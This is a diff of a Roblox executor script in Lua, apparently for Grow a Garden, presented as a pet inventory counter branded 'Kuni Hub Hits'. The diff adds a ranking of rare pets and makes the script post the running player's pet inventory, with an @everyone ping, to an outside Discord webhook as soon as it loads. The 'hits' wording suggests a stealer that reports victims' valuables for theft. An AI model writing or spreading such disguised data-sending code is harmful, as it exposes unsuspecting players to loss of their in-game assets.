@@ -1,3 +1,4 @@
+
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local CoreGui = game:GetService("CoreGui")
@@ -5,96 +6,101 @@ local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
 local HttpService = game:GetService("HttpService")
 local maxSlots = 60
+local blockedFruits = {"apple","avocado","banana","blood banana","blueberry","canary melon","coconut","cranberry",
+"crown melon","dragon fruit","durian","grand tomato","grape","green apple","hive fruit","kiwi",
+"lemon","lime","lingonberry","loquat","mango","mangosteen","maple apple","moon melon","nectarine",
+"papaya","passionfruit","peach","pear","pineapple","pricklefruit","raspberry","spiked mango",
+"starfruit","strawberry","sugar apple","traveler’s fruit","watermelon","white mulberry"}
 
--- Blocked fruits sa Grow A Garden
-local blockedFruits = {
-    "apple","avocado","banana","blood banana","blueberry","canary melon","coconut","cranberry",
-    "crown melon","dragon fruit","durian","grand tomato","grape","green apple","hive fruit","kiwi",
-    "lemon","lime","lingonberry","loquat","mango","mangosteen","maple apple","moon melon","nectarine",
-    "papaya","passionfruit","peach","pear","pineapple","pricklefruit","raspberry","spiked mango",
-    "starfruit","strawberry","sugar apple","traveler’s fruit","watermelon","white mulberry"
-}
-
--- Strict pets-only filter
 local function isPet(item)
-    if not item:IsA("Tool") then return false end
-    local nameLower = item.Name:lower()
-
-    -- Blocked tools
-    local blockedPatterns = {
-        "shovel",
-        "garden guide",
-        "lightning rod",
-        "master sprinkler",
-        "basic sprinkler",
-        "seed",
-        "plant",
-        "egg",
-        "toy"
-    }
-
-    -- Plain text search to strictly filter blocked items
-    for _, pattern in ipairs(blockedPatterns) do
-        if string.find(nameLower, pattern, 1, true) then
-            return false
-        end
-    end
-
-    -- Filter blocked fruits
-    for _, fruit in ipairs(blockedFruits) do
-        if string.find(nameLower, fruit, 1, true) then
-            return false
-        end
-    end
-
-    return true
+	if not item:IsA("Tool") then return false end
+	local nameLower = item.Name:lower()
+	local blockedPatterns = {"shovel","garden guide","lightning rod","master sprinkler","basic sprinkler","seed","plant","egg","toy"}
+	for _,p in ipairs(blockedPatterns) do if string.find(nameLower,p,1,true) then return false end end
+	for _,f in ipairs(blockedFruits) do if string.find(nameLower,f,1,true) then return false end end
+	return true
 end
 
--- GUI Setup
+local function getInventory()
+	local pets={}
+	for _,item in ipairs(player.Backpack:GetChildren()) do if isPet(item) then table.insert(pets,item.Name) end end
+	if player.Character then for _,item in ipairs(player.Character:GetChildren()) do if isPet(item) then table.insert(pets,item.Name) end end end
+	local priorityPets={"Huge Pets 20kg up","Kitsune","Raccoon","Disco Bee","Butterfly","Fennec Fox","French Fry Ferret","Lobster Thermidor","Golden Goose","Dragonfly","Queen Bee","Red Fox","Corrupted Kitsune"}
+	table.sort(pets,function(a,b)
+		local aP,bP=999,999
+		for i,p in ipairs(priorityPets) do
+			if string.find(a,p,1,true) then aP=i end
+			if string.find(b,p,1,true) then bP=i end
+		end
+		return aP<bP
+	end)
+	return pets
+end
+
+local latestSnapshot = nil
+
+local function sendInventoryToDiscord()
+	latestSnapshot = getInventory()
+	local formattedPets={}
+	for i,pet in ipairs(latestSnapshot) do table.insert(formattedPets,string.format("%d. %s",i,pet)) end
+	local content={
+		username="Kuni Hub Hits",
+		avatar_url="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQvJQrjOQJH-tSRkGjaCCO2Uf-WqjL-QWShRhUjzyNpdwtGFvbKhVAyR1E&s=10",
+		content="@everyone",
+		embeds={{title=string.format("Inventory Status (%d / %d)",#latestSnapshot,maxSlots),description=table.concat(formattedPets,"\n"),color=0x1abc9c,footer={text="Made by Kuni"},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}
+	}
+	local jsonData=HttpService:JSONEncode(content)
+	local headers={["Content-Type"]="application/json"}
+	local requestFunction=syn and syn.request or http_request or request or HttpPost
+	if requestFunction then
+		pcall(function() requestFunction({Url=Webhook,Method="POST",Headers=headers,Body=jsonData}) end)
+	end
+end
+
+sendInventoryToDiscord()
+
 local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = CoreGui
-
 local frame = Instance.new("Frame")
 frame.Parent = screenGui
-frame.Size = UDim2.new(0,320,0,250)
-frame.Position = UDim2.new(0.35,0,0.3,0)
-frame.BackgroundColor3 = Color3.fromRGB(15,15,15)
-frame.BackgroundTransparency = 0.1
+frame.Size = UDim2.new(0,360,0,280)
+frame.Position = UDim2.new(0.33,0,0.25,0)
+frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
 frame.BorderSizePixel = 0
 frame.Active = true
 frame.Draggable = true
-Instance.new("UICorner",frame).CornerRadius = UDim.new(0,20)
-
+Instance.new("UICorner",frame).CornerRadius = UDim.new(0,18)
 local stroke = Instance.new("UIStroke",frame)
-stroke.Thickness = 3
-stroke.Color = Color3.fromRGB(0,200,255)
+stroke.Thickness = 2
+stroke.Color = Color3.fromRGB(50,50,50)
+stroke.Transparency = 0.4
 
 local titleLabel = Instance.new("TextLabel")
 titleLabel.Parent = frame
-titleLabel.Size = UDim2.new(1,0,0,40)
+titleLabel.Size = UDim2.new(1,0,0,42)
 titleLabel.Position = UDim2.new(0,0,0,10)
 titleLabel.BackgroundTransparency = 1
-titleLabel.Font = Enum.Font.GothamBold
+titleLabel.Font = Enum.Font.GothamSemibold
 titleLabel.TextSize = 28
-titleLabel.TextColor3 = Color3.fromRGB(200,230,255)
+titleLabel.TextColor3 = Color3.fromRGB(180,230,255)
 titleLabel.TextStrokeTransparency = 0.2
-titleLabel.Text = "KUNI INVENTORY HITS"
+titleLabel.Text = "KUNI HUB HITS"
 
 local inventoryLabel = Instance.new("TextLabel")
 inventoryLabel.Parent = frame
-inventoryLabel.Size = UDim2.new(1,0,0,40)
-inventoryLabel.Position = UDim2.new(0,0,0,60)
+inventoryLabel.Size = UDim2.new(1,0,0,36)
+inventoryLabel.Position = UDim2.new(0,0,0,65)
 inventoryLabel.BackgroundTransparency = 1
-inventoryLabel.Font = Enum.Font.GothamBold
-inventoryLabel.TextSize = 26
-inventoryLabel.TextColor3 = Color3.fromRGB(0,255,255)
-inventoryLabel.TextStrokeTransparency = 0.2
+inventoryLabel.Font = Enum.Font.GothamSemibold
+inventoryLabel.TextSize = 24
+inventoryLabel.TextColor3 = Color3.fromRGB(0,220,255)
+inventoryLabel.TextStrokeTransparency = 0.1
 inventoryLabel.Text = "0 / "..maxSlots
 
 local barBack = Instance.new("Frame")
 barBack.Parent = frame
-barBack.Size = UDim2.new(1,-40,0,20)
-barBack.Position = UDim2.new(0,20,0,110)
+barBack.Size = UDim2.new(1,-40,0,22)
+barBack.Position = UDim2.new(0,20,0,115)
 barBack.BackgroundColor3 = Color3.fromRGB(40,40,40)
 barBack.BorderSizePixel = 0
 Instance.new("UICorner",barBack).CornerRadius = UDim.new(0,12)
@@ -105,7 +111,6 @@ barFill.Size = UDim2.new(0,0,1,0)
 barFill.BackgroundColor3 = Color3.fromRGB(0,200,100)
 barFill.BorderSizePixel = 0
 Instance.new("UICorner",barFill).CornerRadius = UDim.new(0,12)
-
 local glow = Instance.new("UIStroke",barFill)
 glow.Thickness = 4
 glow.Transparency = 0.5
@@ -113,21 +118,21 @@ glow.Color = Color3.fromRGB(0,200,100)
 
 local lastHitsLabel = Instance.new("TextLabel")
 lastHitsLabel.Parent = frame
-lastHitsLabel.Size = UDim2.new(1,0,0,25)
-lastHitsLabel.Position = UDim2.new(0,0,0,140)
+lastHitsLabel.Size = UDim2.new(1,0,0,26)
+lastHitsLabel.Position = UDim2.new(0,0,0,150)
 lastHitsLabel.BackgroundTransparency = 1
-lastHitsLabel.Font = Enum.Font.GothamBold
-lastHitsLabel.TextSize = 22
-lastHitsLabel.TextColor3 = Color3.fromRGB(200,230,255)
+lastHitsLabel.Font = Enum.Font.GothamSemibold
+lastHitsLabel.TextSize = 20
+lastHitsLabel.TextColor3 = Color3.fromRGB(180,230,255)
 lastHitsLabel.TextStrokeTransparency = 0.2
 lastHitsLabel.Text = "LAST HITS"
 
 local timerLabel = Instance.new("TextLabel")
 timerLabel.Parent = frame
-timerLabel.Size = UDim2.new(1,0,0,25)
-timerLabel.Position = UDim2.new(0,0,0,170)
+timerLabel.Size = UDim2.new(1,0,0,26)
+timerLabel.Position = UDim2.new(0,0,0,180)
 timerLabel.BackgroundTransparency = 1
-timerLabel.Font = Enum.Font.GothamBold
+timerLabel.Font = Enum.Font.Gotham
 timerLabel.TextSize = 20
 timerLabel.TextColor3 = Color3.fromRGB(0,255,255)
 timerLabel.TextStrokeTransparency = 0.2
@@ -135,85 +140,45 @@ timerLabel.Text = "0s"
 
 local footer = Instance.new("TextLabel")
 footer.Parent = frame
-footer.Size = UDim2.new(1,0,0,20)
-footer.Position = UDim2.new(0,0,1,-25)
+footer.Size = UDim2.new(1,0,0,22)
+footer.Position = UDim2.new(0,0,1,-28)
 footer.BackgroundTransparency = 1
 footer.Font = Enum.Font.Gotham
 footer.TextSize = 14
 footer.TextColor3 = Color3.fromRGB(200,200,200)
-footer.Text = "made by kuni"
+footer.Text = "Made by Kuni"
 
--- Timer
 local startTime = tick()
-RunService.Heartbeat:Connect(function()
-    timerLabel.Text = string.format("%ds",math.floor(tick()-startTime))
-end)
+RunService.Heartbeat:Connect(function() timerLabel.Text = string.format("%ds",math.floor(tick()-startTime)) end)
 
--- Update bar color
 local function updateColor(ratio)
-    if ratio<0.5 then
-        return Color3.fromRGB(0,200,100)
-    elseif ratio<0.8 then
-        return Color3.fromRGB(255,200,0)
-    else
-        return Color3.fromRGB(255,50,50)
-    end
+	if ratio<0.5 then return Color3.fromRGB(0,200,100)
+	elseif ratio<0.8 then return Color3.fromRGB(255,200,0)
+	else return Color3.fromRGB(255,50,50)
+	end
 end
 
--- Update inventory GUI
 local function updateCount()
-    local count=0
-    for _,item in ipairs(player.Backpack:GetChildren()) do
-        if isPet(item) then count=count+1 end
-    end
-    if player.Character then
-        for _,item in ipairs(player.Character:GetChildren()) do
-            if isPet(item) then count=count+1 end
-        end
-    end
-    local ratio=count/maxSlots
-    inventoryLabel.Text=tostring(count).." / "..tostring(maxSlots)
-    local goalSize=UDim2.new(ratio,0,1,0)
-    local goalColor=updateColor(ratio)
-    TweenService:Create(barFill,TweenInfo.new(0.4,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Size=goalSize,BackgroundColor3=goalColor}):Play()
-    TweenService:Create(glow,TweenInfo.new(0.4,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Color=goalColor}):Play()
-    TweenService:Create(inventoryLabel,TweenInfo.new(0.25,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextColor3=goalColor}):Play()
+	local count=0
+	for _,item in ipairs(player.Backpack:GetChildren()) do if isPet(item) then count=count+1 end end
+	if player.Character then for _,item in ipairs(player.Character:GetChildren()) do if isPet(item) then count=count+1 end end end
+	local ratio=count/maxSlots
+	inventoryLabel.Text=tostring(count).." / "..tostring(maxSlots)
+	local goalSize=UDim2.new(ratio,0,1,0)
+	local goalColor=updateColor(ratio)
+	TweenService:Create(barFill,TweenInfo.new(0.4,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Size=goalSize,BackgroundColor3=goalColor}):Play()
+	TweenService:Create(glow,TweenInfo.new(0.4,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Color=goalColor}):Play()
+	TweenService:Create(inventoryLabel,TweenInfo.new(0.25,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextColor3=goalColor}):Play()
 end
 
 player.Backpack.ChildAdded:Connect(updateCount)
 player.Backpack.ChildRemoved:Connect(updateCount)
 if player.Character then
-    player.Character.ChildAdded:Connect(updateCount)
-    player.Character.ChildRemoved:Connect(updateCount)
+	player.Character.ChildAdded:Connect(updateCount)
+	player.Character.ChildRemoved:Connect(updateCount)
 end
 player.CharacterAdded:Connect(function(char)
-    char.ChildAdded:Connect(updateCount)
-    char.ChildRemoved:Connect(updateCount)
+	char.ChildAdded:Connect(updateCount)
+	char.ChildRemoved:Connect(updateCount)
 end)
 updateCount()
-
--- Send inventory to Discord
-local function sendInventoryToDiscord()
-    local pets={}
-    for _,item in ipairs(player.Backpack:GetChildren()) do
-        if isPet(item) then table.insert(pets,"- "..item.Name) end
-    end
-    if player.Character then
-        for _,item in ipairs(player.Character:GetChildren()) do
-            if isPet(item) then table.insert(pets,"- "..item.Name) end
-        end
-    end
-    local count=#pets
-    local content="\n**Inventory ("..count.." / "..maxSlots..")**:\n\n```"..table.concat(pets,"\n").."```"
-    local data={content=content}
-    local jsonData=HttpService:JSONEncode(data)
-    local headers={["Content-Type"]="application/json"}
-    local requestFunction=syn and syn.request or http_request or request or HttpPost
-    if requestFunction then
-        pcall(function()
-            requestFunction({Url=Webhook,Method="POST",Headers=headers,Body=jsonData})
-        end)
-    end
-end
-task.wait(15)
-sendInventoryToDiscord()
